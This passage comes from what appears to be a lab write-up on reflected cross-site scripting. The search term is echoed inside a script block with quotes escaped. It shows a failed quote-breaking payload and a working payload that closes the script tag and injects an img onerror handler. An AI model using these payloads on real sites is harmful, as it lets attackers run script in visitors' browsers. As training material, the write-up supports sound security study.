## 2Ô∏è‚É£ Understanding the Lab Scenario

- The site contains a **search box**.
    
- When you type any word and click **Search**, the **entered word is displayed inside the results page**.

- I tried to exploit the vulnerability using this payload:
    
    ```js
    ';alert(0);// 
    ```
    
    But **it didn't work** because the site escapes **single quotes `'` and backslashes `\`**.

## 3Ô∏è‚É£ The Most Important Point

### üí° Breaking the string is not possible using `'` alone, because the browser turns it into:

```js
var searchTerms = 'test\'payload';
```

---

## 4Ô∏è‚É£ The Main Exploitation Idea

- After examining the code, it turned out that the reflection is inside a `<script>` element, so it's possible to **break out of the block using `</script>` and add a new script**.
    
- The JavaScript code in the page:
    

```html
<script>
  var searchTerms = '</script><img src=x onerror=confirm()>';
  var encodedSearchTerms = encodeURIComponent(searchTerms);
  var trackerImage = '<img src="/resources/images/tracker.gif?searchTerms=' + encodedSearchTerms + '">';
  document.write(trackerImage);
</script>
```

---

## 5Ô∏è‚É£ The Final Payload

```html
</script><img src=x onerror=confirm()>
```

- This payload breaks out of the `<script>` element and then adds an `<img>` element that executes `confirm()` when the image fails to load.
